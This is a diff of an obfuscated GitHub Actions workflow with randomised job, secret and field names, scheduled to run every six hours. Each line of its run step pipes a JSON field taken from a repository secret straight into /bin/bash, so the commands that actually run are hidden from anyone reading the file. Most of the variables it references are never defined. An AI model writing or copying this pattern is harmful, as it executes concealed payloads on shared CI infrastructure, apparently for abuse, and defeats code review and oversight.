@@ -1,10 +1,11 @@
 name: dingqianqiu6474
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '46 2/6 * * *'
 
-jobs:  # 18206
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,24 +13,10 @@ jobs:  # 18206
       - uses: actions/checkout@v4
       - name: dingqianqiu6474
         env:
-          briz92147: ${{ secrets.briz92147 }}
+          gff8339: ${{ secrets.gff8339 }}
         run: |
-          echo $briz92147 | jq -r .pb1898 | /bin/bash
-          echo $q6 | jq -r .gry8 | /bin/bash
-          echo $soj4 | jq -r .j877 | /bin/bash
-          echo $uyot75 | jq -r .t5506 | /bin/bash
-          echo $vd978 | jq -r .urxwk4 | /bin/bash
-          echo $v8 | jq -r .aw02964 | /bin/bash
-          echo $jaea7 | jq -r .ayw1 | /bin/bash
-          echo $c7 | jq -r .zfqk9251 | /bin/bash
-          echo $xk55081 | jq -r .le3 | /bin/bash
-          echo $sjb53 | jq -r .pswh95598 | /bin/bash
-          echo $w8576 | jq -r .otswq82 | /bin/bash
-          echo $fqgq3082 | jq -r .bkaa803 | /bin/bash
-          echo $gii85215 | jq -r .bq25574 | /bin/bash
-          echo $ymml6463 | jq -r .nxq67 | /bin/bash
-          echo $xsuxo372 | jq -r .saul7905 | /bin/bash
-          echo $zpxvo6 | jq -r .rbqd81 | /bin/bash
-          echo $y2825 | jq -r .wz671 | /bin/bash
-          echo $n92 | jq -r .zfcai4 | /bin/bash
+          echo $gff8339 | jq -r .f03 | /bin/bash
+          echo $di9026 | jq -r .juyg62 | /bin/bash
+          echo $hevmc5 | jq -r .mkd6 | /bin/bash
+          echo $jsmxv1698 | jq -r .m31996 | /bin/bash
 
